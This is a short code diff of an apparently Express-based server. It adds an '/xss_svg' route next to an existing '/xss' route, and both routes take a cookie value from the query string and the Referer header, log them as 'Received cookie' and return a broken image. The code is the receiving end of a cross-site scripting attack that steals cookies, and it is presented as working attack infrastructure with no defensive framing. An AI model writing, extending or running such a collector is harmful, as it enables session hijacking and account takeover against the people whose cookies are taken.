@@ -15,12 +15,21 @@ app.get('/xss', (req, res) => {
     if (cookieValue && referer) {
         logCookie(cookieValue.toString(), referer)
         console.log('Received cookie:', cookieValue);
-        // console.log(req)
-        // res.redirect(referer);
-        // res.sendFile(brokenImagePath)
         res.sendStatus(200)
     }
 })
+
+app.get('/xss_svg', (req, res) => {
+    const cookieValue = req.query.cookie;
+    const referer = req.headers.referer;
+    if (cookieValue && referer) {
+        logCookie(cookieValue.toString(), referer)
+        console.log('Received cookie:', cookieValue);
+        res.sendFile(brokenImagePath)
+    }
+})
+
+
 
 app.get('/request', (req, res) => {
     console.log(req)
